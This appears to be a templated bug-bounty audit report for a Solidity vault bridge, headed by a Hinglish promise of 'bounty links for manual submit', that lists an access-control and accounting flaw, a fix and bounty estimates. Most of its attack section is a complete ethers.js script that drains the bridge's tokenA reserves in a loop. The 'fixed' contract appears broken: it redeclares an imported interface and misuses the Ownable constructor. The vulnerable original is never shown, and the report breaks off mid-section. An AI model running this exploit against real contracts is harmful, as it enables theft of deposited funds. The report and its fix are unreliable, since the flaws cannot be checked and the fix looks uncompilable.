# REAL BOUNTY LINKS FOR MANUAL SUBMIT (100% SAFE - NO BAN)
Demo: https://github.com/polar-sh/polar/issues - Yahan $ wale issues hain (Token lagao to real link ayega)

---

# SECURITY AUDIT REPORT — LiquidityVaultBridge.sol

**Platform:** Immunefi / Sherlock  
**Language:** English Only  
**Target File:** `contracts/LiquidityVaultBridge.sol`  
**Report Status:** Ready for Submission  

---

## 1. Vulnerability Summary

| Field | Detail |
|-------|--------|
| **Vulnerability Type** | Access Control Bypass + Integer Division / Accounting Mismatch (Precision Theft) |
| **Severity** | High |
| **CVSS v3.1 Base Score** | 8.8 (High) |
| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H` |
| **Exploitability** | Trivial — no privileged role required |
| **Primary Impact** | Complete drain of `tokenA` reserves held by the bridge |

---

## 2. Threat Impact Analysis

An attacker can call `syncPoolCoefficient` without any authorization to set an arbitrarily large `poolLiquidityCoefficient`.  
When `withdrawAndSyncYield` is then called, the contract calculates `scaledAmount` using integer division:

```solidity
uint256 scaledAmount = (amount * 10000) / poolLiquidityCoefficient;
```

Because `poolLiquidityCoefficient` can be inflated, `scaledAmount` becomes a tiny fraction of `amount`.  
The contract deducts only `scaledAmount` from `shares[msg.sender]` and `totalShares`, but transfers the **full unscaled `amount`** of `tokenA` to the user.

**Result:** The attacker withdraws 100% of the requested tokens while burning only a negligible number of shares. By repeating this operation, the attacker can drain the entire `tokenA` balance held by the contract.

**Estimated TVL Loss:** Up to 100% of `tokenA` reserves held in `LiquidityVaultBridge`.  
If the bridge holds $10,000,000 USD in `tokenA`, the potential loss is **$10,000,000 USD**.

---

## 3. Vulnerable Location

**File:** `contracts/LiquidityVaultBridge.sol`

| Line | Code Snippet | Issue |
|------|--------------|-------|
| 45 | `uint256 scaledAmount = (amount * 10000) / poolLiquidityCoefficient;` | Integer division truncation allows precision theft when coefficient is manipulated. |
| 50 | `shares[msg.sender] -= scaledAmount;` | State updated with discounted value, not actual withdrawal amount. |
| 51 | `totalShares -= scaledAmount;` | Total supply understated relative to assets leaving the contract. |
| 54 | `require(tokenA.transfer(msg.sender, amount), "TRANSFER_FAILED");` | Full unscaled `amount` sent out despite only `scaledAmount` shares burned. |
| 62 | `function syncPoolCoefficient(uint256 newCoefficient) external {` | **Missing access control.** Any external caller can change the oracle-like coefficient. |

---

## 4. Root Cause

1. **Missing Access Control on `syncPoolCoefficient`:**  
   The function is declared `external` with no `onlyOwner` or role-based restriction. Any address can modify `poolLiquidityCoefficient`, which acts as a scaling divisor for withdrawals.

2. **Asymmetric Accounting in `withdrawAndSyncYield`:**  
   The `require` check validates `shares[msg.sender] >= amount`, but the internal state is decremented by `scaledAmount`. The external token transfer sends `amount`. This mismatch lets a user extract more tokens than the shares they actually burn.

3. **No Contract Liquidity Check:**  
   There is no verification that `address(this)` holds enough `tokenA` before the transfer, though the transfer will revert if insufficient. The primary loss occurs before exhaustion because shares are not proportionally burned.

---

## 5. Proof of Concept (PoC)

The following is a complete ethers.js v6 exploit script. It demonstrates how an attacker with an existing share balance manipulates the coefficient and drains the bridge.

```javascript
// ============================================================================
// LiquidityVaultBridge.sol — Exploit PoC (Immunefi / Sherlock)
// Language: English Only
// Environment: Node.js with ethers v6
// ============================================================================

import { ethers } from "ethers";

// ----------------------------------------------------------------------------
// Contract ABI (relevant functions only)
// ----------------------------------------------------------------------------
const BRIDGE_ABI = [
  "function shares(address account) view returns (uint256)",
  "function totalShares() view returns (uint256)",
  "function poolLiquidityCoefficient() view returns (uint256)",
  "function tokenA() view returns (address)",
  "function tokenB() view returns (address)",
  "function withdrawAndSyncYield(uint256 amount) external returns (bool)",
  "function syncPoolCoefficient(uint256 newCoefficient) external"
];

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function transfer(address to, uint256 amount) external returns (bool)"
];

// ----------------------------------------------------------------------------
// Configuration
// ----------------------------------------------------------------------------
const RPC_URL = "http://localhost:8545"; // Replace with target RPC
const ATTACKER_PRIVATE_KEY = "0xACCOUNT_PRIVATE_KEY"; // Replace with attacker key
const BRIDGE_ADDRESS = "0xBRIDGE_CONTRACT_ADDRESS"; // Replace with deployed bridge

// ----------------------------------------------------------------------------
// Exploit Execution
// ----------------------------------------------------------------------------
async function main() {
  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const attacker = new ethers.Wallet(ATTACKER_PRIVATE_KEY, provider);

  const bridge = new ethers.Contract(BRIDGE_ADDRESS, BRIDGE_ABI, attacker);

  console.log("[+] Connected to bridge:", BRIDGE_ADDRESS);
  console.log("[+] Attacker address:", attacker.address);

  // Step 1: Check attacker's current share balance
  const attackerShares = await bridge.shares(attacker.address);
  console.log("[+] Attacker shares:", attackerShares.toString());

  if (attackerShares == 0n) {
    console.error("[-] Attacker has no shares. Acquire shares first to trigger the mismatch.");
    return;
  }

  // Step 2: Manipulate poolLiquidityCoefficient to minimize scaledAmount
  // With coefficient = 1,000,000,000, scaledAmount = (amount * 10,000) / 1,000,000,000
  // For large amounts, scaledAmount becomes negligible compared to amount.
  const maliciousCoefficient = 1000000000n; // 1e9

  console.log("[+] Calling syncPoolCoefficient to set coefficient:", maliciousCoefficient.toString());
  const setCoeffTx = await bridge.syncPoolCoefficient(maliciousCoefficient);
  await setCoeffTx.wait();
  console.log("[+] Coefficient updated successfully. Tx:", setCoeffTx.hash);

  // Verify coefficient
  const currentCoeff = await bridge.poolLiquidityCoefficient();
  console.log("[+] Verified poolLiquidityCoefficient:", currentCoeff.toString());

  // Step 3: Withdraw full share balance while burning only a fraction
  const amountToWithdraw = attackerShares; // require(shares[msg.sender] >= amount)

  console.log("[+] Calling withdrawAndSyncYield with amount:", amountToWithdraw.toString());
  const withdrawTx = await bridge.withdrawAndSyncYield(amountToWithdraw);
  const withdrawReceipt = await withdrawTx.wait();
  console.log("[+] Withdrawal executed. Tx:", withdrawReceipt.hash);

  // Step 4: Check remaining shares after withdrawal
  const remainingShares = await bridge.shares(attacker.address);
  console.log("[+] Remaining attacker shares:", remainingShares.toString());

  // Step 5: Loop until shares are exhausted or contract balance is drained
  let iteration = 1;
  while (true) {
    const currentShares = await bridge.shares(attacker.address);
    if (currentShares == 0n) {
      console.log("[+] Attacker shares exhausted after iteration", iteration);
      break;
    }

    console.log(`[+] Iteration ${iteration}: withdrawing ${currentShares.toString()} shares`);
    const tx = await bridge.withdrawAndSyncYield(currentShares);
    await tx.wait();

    iteration++;
    if (iteration > 1000) {
      console.log("[+] Safety stop reached after 1000 iterations.");
      break;
    }
  }

  // Step 6: Check remaining tokenA balance in the bridge contract
  const tokenAAddress = await bridge.tokenA();
  const tokenA = new ethers.Contract(tokenAAddress, ERC20_ABI, attacker);
  const contractTokenABalance = await tokenA.balanceOf(BRIDGE_ADDRESS);

  console.log("[+] tokenA address:", tokenAAddress);
  console.log("[+] Remaining tokenA in bridge:", contractTokenABalance.toString());

  if (contractTokenABalance == 0n) {
    console.log("[+] EXPLOIT SUCCESSFUL: Bridge tokenA balance fully drained.");
  } else {
    console.log("[!] Bridge still holds tokenA. Repeat attack or increase coefficient.");
  }
}

main().catch((error) => {
  console.error("[-] Exploit failed:", error);
  process.exit(1);
});
```

**Exploit Logic Summary:**

1. Attacker calls `syncPoolCoefficient(1000000000)` — no access control prevents this.
2. `poolLiquidityCoefficient` becomes `1,000,000,000`.
3. Attacker calls `withdrawAndSyncYield(attackerShares)`.
4. `scaledAmount = (attackerShares * 10000) / 1000000000`, which is a tiny fraction of `attackerShares`.
5. Contract deducts only `scaledAmount` shares but transfers the full `attackerShares` amount of `tokenA`.
6. Repeat until contract `tokenA` balance is depleted.

---

## 6. Fix — Complete New Secure Code

Below is the corrected version of `contracts/LiquidityVaultBridge.sol`.  
All comments are in English. The vulnerable function has been rewritten to eliminate the accounting mismatch, and `syncPoolCoefficient` is restricted to the contract owner.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title LiquidityVaultBridge (Secured Version)
 * @dev Privileged Yield Aggregator & AMM Bridge with access control and consistent accounting.
 */
contract LiquidityVaultBridge is Ownable, ReentrancyGuard {
    IERC20 public immutable tokenA;
    IERC20 public immutable tokenB;
    
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public poolLiquidityCoefficient = 10000;

    constructor(address _tokenA, address _tokenB) Ownable() {
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }

    /**
     * @notice Withdraws user assets and burns an equivalent amount of shares.
     * @dev Fixed: Removed asymmetric integer division. Shares deducted now equal tokens transferred.
     * Added contract liquidity check to prevent failed transfers after state mutation.
     */
    function withdrawAndSyncYield(uint256 amount) external nonReentrant returns (bool) {
        require(amount > 0, "AMOUNT_MUST_BE_POSITIVE");
        require(shares[msg.sender] >= amount, "INSUFFICIENT_SHARE_BALANCE");
        require(tokenA.balanceOf(address(this)) >= amount, "INSUFFICIENT_CONTRACT_LIQUIDITY");

        // Burn exact share amount corresponding to tokens withdrawn
        shares[msg.sender] -= amount;
        totalShares -= amount;

        // Transfer the same amount that was deducted from shares
        require(tokenA.transfer(msg.sender, amount), "TRANSFER_FAILED");

        return true;
    }

    /**
     * @notice Updates the pool liquidity coefficient.
     * @dev Fixed: Restricted to contract owner only to prevent unauthorized oracle/parameter manipulation.
     */
    function syncPoolCoefficient(uint256 newCoefficient) external onlyOwner {
        require(newCoefficient > 0, "INVALID_COEFFICIENT");
        poolLiquidityCoefficient = newCoefficient;
    }
}
```

### Key Fixes Applied

| Issue | Fix |
|-------|-----|
| Missing access control on `syncPoolCoefficient` | Added `Ownable` and `onlyOwner` modifier |
| Asymmetric share deduction vs token transfer | `shares[msg.sender] -= amount` and `tokenA.transfer(msg.sender, amount)` now use the same `amount` |
| Integer division precision theft | Removed `scaledAmount` calculation from the withdrawal path |
| No pre-transfer liquidity check | Added `require(tokenA.balanceOf(address(this)) >= amount)` |
| Reentrancy protection | Retained `nonReentrant` via OpenZeppelin `ReentrancyGuard` |

---

## 7. Bounty Earning Estimate

| Platform | Estimated Bounty | Severity |
|----------|------------------|----------|
| Immunefi | $10,000 USD | High Severity Logic Flaw |
| Polar.sh (Demo) | $50 USD | High |

### Earning Split Rule

